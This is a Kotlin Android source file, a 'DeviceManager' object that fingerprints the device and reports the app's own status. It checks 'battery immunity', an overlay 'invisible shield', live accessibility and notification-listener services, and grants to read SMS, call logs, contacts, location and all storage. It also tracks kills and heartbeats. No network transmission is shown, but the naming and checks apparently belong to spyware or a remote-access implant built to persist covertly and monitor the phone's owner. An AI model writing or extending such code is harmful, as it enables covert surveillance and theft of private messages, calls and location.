package com.example.myandroid

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONObject
import java.io.File

object DeviceManager {

    fun getDeviceId(ctx: Context): String {
        val prefs = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE)
        var id = prefs.getString("device_uuid", null)
        if (id == null) {
            id = java.util.UUID.randomUUID().toString()
            prefs.edit().putString("device_uuid", id).apply()
        }
        return id!!
    }

    fun getStaticInfo(ctx: Context): JSONObject {
        val deviceId = getDeviceId(ctx)
        val json = JSONObject()
        try {
            // 0. Identity
            json.put("device_id", deviceId)
            
            // 1. Software
            json.put("model", Build.MODEL)
            json.put("manufacturer", Build.MANUFACTURER)
            json.put("brand", Build.BRAND)
            json.put("device", Build.DEVICE)
            json.put("board", Build.BOARD)
            json.put("android_ver", Build.VERSION.RELEASE)
            json.put("sdk", Build.VERSION.SDK_INT)
            json.put("security_patch", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Build.VERSION.SECURITY_PATCH else "unknown")
            
            // 2. Hardware (RAM)
            val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            json.put("total_ram_gb", memInfo.totalMem / (1024.0 * 1024.0 * 1024.0))
            
            // 3. Display
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)
            json.put("screen_res", "${dm.widthPixels}x${dm.heightPixels}")
            json.put("screen_dpi", dm.densityDpi)
            
            // 4. CPU (Rough estimate)
            json.put("cpu_cores", Runtime.getRuntime().availableProcessors())
            json.put("arch", System.getProperty("os.arch"))

        } catch (e: Exception) { e.printStackTrace() }
        return json
    }

    fun getDiagnosticReport(ctx: Context): String {
        val sb = StringBuilder()
        sb.append("\n--- SYSTEM DIAGNOSTICS ---\n")
        
        // 1. IMMORTALITY CHECKS
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val isIgnored = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) pm.isIgnoringBatteryOptimizations(ctx.packageName) else true
        sb.append("BATTERY IMMUNITY: ").append(if(isIgnored) "[ACTIVE]" else "[VULNERABLE]").append("\n")
        
        val overlay = android.provider.Settings.canDrawOverlays(ctx)
        sb.append("INVISIBLE SHIELD: ").append(if(overlay) "[ACTIVE]" else "[MISSING]").append("\n")
        
        // 2. SENSORS
        val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
        val accAlive = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            .any { it.resolveInfo.serviceInfo.packageName == ctx.packageName }
        sb.append("ACCESSIBILITY:  ").append(if(accAlive) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
        
        val notifAlive = androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
        sb.append("NOTIF LISTENER:   ").append(if(notifAlive) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
        
        // 3. PERMISSIONS
        val perms = mapOf(
            "GPS" to android.Manifest.permission.ACCESS_FINE_LOCATION,
            "SMS" to android.Manifest.permission.READ_SMS,
            "CALL" to android.Manifest.permission.READ_CALL_LOG,
            "FILE" to android.Manifest.permission.READ_EXTERNAL_STORAGE
        )
        sb.append("PERMISSIONS:      ")
        perms.forEach { (k, v) ->
            val granted = androidx.core.content.ContextCompat.checkSelfPermission(ctx, v) == PackageManager.PERMISSION_GRANTED
            sb.append("$k:").append(if(granted) "✓ " else "✗ ")
        }
        sb.append("\n")
        
        // 4. STATS
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val kills = try { JSONObject(prefs.getString("app_health", "{}")).optInt("kill_count", 0) } catch(e:Exception){0}
        sb.append("SYSTEM KILLS:     $kills\n")
        sb.append("LAST HEARTBEAT:   ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(prefs.getLong("last_heartbeat", 0L)))}")
        
        return sb.toString()
    }

    fun getDeviceScore(ctx: Context): Pair<Int, String> {
        var score = 0
        try {
            // 1. RAM (Max 40)
            val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            val ramGb = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
            
            score += when {
                ramGb >= 11.5 -> 40
                ramGb >= 7.5 -> 30
                ramGb >= 5.5 -> 20
                ramGb >= 3.5 -> 10
                else -> 5
            }
            // 2. CPU (Max 20)
            val cores = Runtime.getRuntime().availableProcessors()
            score += if (cores >= 8) 15 else 5
            if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) score += 5
            // 3. OS (Max 25)
            val sdk = Build.VERSION.SDK_INT
            score += when {
                sdk >= 34 -> 25
                sdk >= 31 -> 20
                sdk >= 29 -> 15
                else -> 5
            }
            // 4. DISPLAY (Max 15)
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)
            if (dm.densityDpi >= 400) score += 15 else if (dm.densityDpi >= 300) score += 10 else score += 5
        } catch (e: Exception) { return Pair(0, "UNKNOWN") }

        val label = when(score) {
            in 90..100 -> "FLAGSHIP OMEGA"
            in 75..89 -> "HIGH-PERFORMANCE"
            in 55..74 -> "STANDARD ISSUE"
            in 30..54 -> "LEGACY ARTIFACT"
            else -> "OBSOLETE TECH"
        }
        return Pair(score, label)
    }

    fun getHealthStats(ctx: Context): JSONObject {
        val json = JSONObject()
        
        // 1. Permission Matrix
        val perms = JSONObject()
        val critical = listOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.MANAGE_EXTERNAL_STORAGE
        )
        for (p in critical) {
            val name = p.split(".").last()
            val granted = if (p == android.Manifest.permission.MANAGE_EXTERNAL_STORAGE && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                android.os.Environment.isExternalStorageManager()
            } else {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
            }
            perms.put(name, granted)
        }
        json.put("permissions", perms)

        // 2. Service Status
        val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
        val accEnabled = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            .any { it.resolveInfo.serviceInfo.packageName == ctx.packageName }
        json.put("accessibility_alive", accEnabled)
        
        val notifEnabled = androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
        json.put("notification_listener_alive", notifEnabled)

        // 3. Battery / Immortality Status
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val isIgnored = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pm.isIgnoringBatteryOptimizations(ctx.packageName)
        } else true
        json.put("battery_optimization_ignored", isIgnored)
        
        // 4. App Interaction
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        json.put("total_interactions_recorded", prefs.getInt("interaction_count", 0))
        json.put("uptime_timestamp", System.currentTimeMillis())

        return json
    }
}